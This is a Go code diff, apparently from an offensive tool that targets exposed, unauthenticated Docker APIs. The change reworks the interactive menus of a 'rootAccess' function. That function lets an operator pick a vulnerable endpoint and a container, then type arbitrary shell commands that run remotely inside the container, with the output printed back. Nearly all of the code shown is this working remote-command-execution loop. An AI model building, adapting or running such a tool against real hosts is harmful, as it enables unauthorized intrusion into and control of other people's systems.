@@ -57,73 +57,87 @@ func gatherInformation(api *vulnerableDockerAPI) error {
 }
 
 func rootAccess(targets []vulnerableDockerAPI) error {
-	var targetList []string
-	tmap := make(map[string]vulnerableDockerAPI)
-	for _, t := range targets {
-		targetList = append(targetList, t.Endpoint)
-		tmap[t.Endpoint] = t
-	}
-
-	prompt := promptui.Select{
-		Label: "Select target",
-		Items: targetList,
-	}
-
-	_, targetEndpoint, err := prompt.Run()
-	if err != nil {
-		return err
-	}
-
-	target := tmap[targetEndpoint]
-
-	var containerList []string
-	cmap := make(map[string]dockerContainer)
-	for _, c := range target.Containers {
-		containerList = append(containerList, c.ID)
-		cmap[c.ID] = c
-	}
-
-	prompt = promptui.Select{
-		Label: "Select container",
-		Items: containerList,
-	}
-
-	_, containerID, err := prompt.Run()
-	if err != nil {
-		return err
-	}
-
-	docker, err := client.NewClient(target.Endpoint, "1.39", nil, nil)
-	if err != nil {
-		return err
-	}
-
 	for {
-		prompt := promptui.Prompt{
-			Label: containerID[:6] + " $>",
-			Templates: &promptui.PromptTemplates{
-				Prompt:  "{{ . }} ",
-				Valid:   "{{ . }} ",
-				Invalid: "{{ . }} ",
-				Success: "{{ . }} ",
-			},
+		var targetList []string
+		tmap := make(map[string]vulnerableDockerAPI)
+		for _, t := range targets {
+			targetList = append(targetList, t.Endpoint)
+			tmap[t.Endpoint] = t
+		}
+		targetList = append(targetList, "exit")
+
+		prompt := promptui.Select{
+			Label: "Select target",
+			Items: targetList,
 		}
 
-		command, err := prompt.Run()
+		_, targetEndpoint, err := prompt.Run()
 		if err != nil {
 			return err
 		}
 
-		if command == "exit" {
-			break
+		if targetEndpoint == "exit" {
+			return nil
 		}
 
-		output, err := execCommand(docker, containerID, command)
-		if err != nil {
-			return err
-		}
+		target := tmap[targetEndpoint]
 
-		fmt.Println(output)
+		var containerList []string
+		cmap := make(map[string]dockerContainer)
+		for _, c := range target.Containers {
+			containerList = append(containerList, c.ID)
+			cmap[c.ID] = c
+		}
+		containerList = append(containerList, "back")
+
+		for {
+			prompt = promptui.Select{
+				Label: "Select container",
+				Items: containerList,
+			}
+
+			_, containerID, err := prompt.Run()
+			if err != nil {
+				return err
+			}
+
+			if containerID == "back" {
+				break
+			}
+
+			docker, err := client.NewClient(target.Endpoint, "1.39", nil, nil)
+			if err != nil {
+				return err
+			}
+
+			for {
+				prompt := promptui.Prompt{
+					Label: containerID[:6] + " $>",
+					Templates: &promptui.PromptTemplates{
+						Prompt:  "{{ . }} ",
+						Valid:   "{{ . }} ",
+						Invalid: "{{ . }} ",
+						Success: "{{ . }} ",
+					},
+				}
+
+				command, err := prompt.Run()
+				if err != nil {
+					return err
+				}
+
+				if command == "exit" {
+					break
+				}
+
+				output, err := execCommand(docker, containerID, command)
+				if err != nil {
+					return err
+				}
+
+				fmt.Println(output)
+			}
+		}
 	}
 
 	return nil
